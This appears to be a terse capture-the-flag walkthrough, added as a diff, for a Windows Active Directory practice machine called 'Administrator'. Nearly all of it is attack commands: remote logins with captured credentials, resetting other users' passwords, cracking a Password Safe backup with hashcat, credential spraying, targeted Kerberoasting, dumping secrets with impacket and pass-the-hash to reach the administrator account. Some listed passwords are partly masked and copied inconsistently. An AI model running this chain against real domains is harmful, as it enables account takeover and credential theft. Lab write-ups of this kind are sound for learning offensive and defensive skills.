@@ -1,0 +1,60 @@
+
+#ADMINISTRATOR (window lab)
+
+evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
+net users
+net user michael Password123
+
+net tab:-
+evil-winrm -i 10.10.11.42 -u 'michael' -p 'Password123'
+net rpc password "benjamin" "Batman@123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"
+
+Username: Benjamin
+
+Password: Batman@123
+
+ftp benjamin@10.10.11.42
+>get Backup.psafe3
+
+new tab:-hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
+Master Password: tekieromucho
+
+Download passwordsafe by this link (https://github.com/pwsafe/pwsafe.git) with Backup.psafe3file name master password 
+
+Alexander Smith:
+
+Username: alexander
+
+Password: UrkIbagoxMyUGw0_xxx_B0AXSea4Sw
+
+Emily Rodriguez:
+
+Username: emily
+
+Password: UXLCI5iETUsIBo_xxx_QFKoHjXmb
+
+Emma Johnson:
+
+Username: emma
+
+Password: WwANQWnmJnGV07_xxx_bMS7FMAbjNur
+
+Than you will get this username and password
+
+
+nxc smb 10.10.11.42 -u /home/kali/Username.txt -p /home/kali/Password.txt --continue-on-success
+or 
+evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUs_xxx_VTj8yQFKoHjXmb'
+user flag
+
+
+Here you have to download targetedkerberoast :-
+python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXm'
+
+ impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.10.11.42' ( In this you will get the hash of administrator )
+
+evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+>whoami
+>cd Desktop
+>ls
+>cat root.txt
